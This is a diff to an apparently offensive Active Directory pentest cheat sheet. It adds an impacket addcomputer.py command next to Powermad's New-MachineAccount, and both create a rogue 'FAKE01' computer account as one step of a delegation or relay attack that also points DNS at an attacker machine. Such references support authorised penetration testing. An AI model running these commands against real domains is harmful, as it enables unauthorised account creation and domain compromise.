@@ -793,9 +793,12 @@ Get-DomainObject | Where-Object ms-ds-machineaccountquota | select-object ms-ds-
 
 #### Create a new computer object
 - https://github.com/Kevin-Robertson/Powermad
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
 ```
 import-module powermad
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+
+python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<USER>:<PASS> -dc-ip <DC IP>
 ```
 
 #### Get the object SID
@@ -972,9 +975,12 @@ cme ldap <DC IP> -d <DOMAIN> -u <USER> -p <PASS> -M maq
 
 #### Create a new computer object
 - https://github.com/Kevin-Robertson/Powermad
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
 ```
 import-module powermad
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+
+python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<USER>:<PASS> -dc-ip <DC IP>
 ```
 
 #### Create a DNS record pointing to the attacker's machine IP
